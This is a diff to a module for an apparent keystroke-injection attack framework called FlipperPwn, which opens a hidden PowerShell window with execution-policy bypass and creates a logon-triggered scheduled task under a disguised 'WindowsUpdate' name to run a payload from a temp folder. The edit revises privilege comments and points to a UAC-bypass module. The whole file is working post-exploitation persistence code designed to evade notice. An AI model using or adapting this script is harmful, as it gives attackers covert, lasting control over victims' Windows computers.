@@ -1,29 +1,30 @@
 # FlipperPwn Module: Windows Persistence via Scheduled Task
 # Creates a scheduled task that runs the payload at every user logon.
-# Does NOT require admin — task is created under the current user's security context.
+# Requires admin — schtasks /sc onlogon needs elevated privileges.
+# Run uac_bypass_fodhelper first if not already elevated.
 # The task is given a generic Windows-sounding name to blend in with legitimate tasks.
 #
 # To verify: schtasks /query /tn "{{TASK_NAME}}" /fo LIST /v
 # To remove: schtasks /delete /tn "{{TASK_NAME}}" /f
 
 NAME persist_schtask
-DESCRIPTION Create a logon-triggered scheduled task for user-level persistence (no admin required)
+DESCRIPTION Create a logon-triggered scheduled task for persistence (requires admin)
 CATEGORY post
 PLATFORMS WIN
 
 OPTION TASK_NAME WindowsUpdate "Name of the scheduled task (use a Windows-sounding name)"
-OPTION PAYLOAD_PATH C:\\Windows\\Temp\\update.exe "Full path to the payload executable to run at logon"
+OPTION PAYLOAD_PATH %TEMP%\\update.exe "Full path to the payload executable to run at logon"
 
 PLATFORM WIN
   # Open hidden PowerShell via Run dialog
   DELAY 500
   GUI r
-  DELAY 300
+  DELAY 500
   STRING powershell -w h -nop -ep bypass
   ENTER
   DELAY 1000
-  # /sc onlogon — triggers at any user logon
-  # /ru %USERNAME% — runs as the current user, no admin needed
+  # /sc onlogon — triggers at any user logon (requires admin)
+  # /ru %USERNAME% — runs as the current user
   # /f — force-creates even if a task with this name exists
   STRING schtasks /create /tn "{{TASK_NAME}}" /tr "{{PAYLOAD_PATH}}" /sc onlogon /ru "%USERNAME%" /f
   ENTER
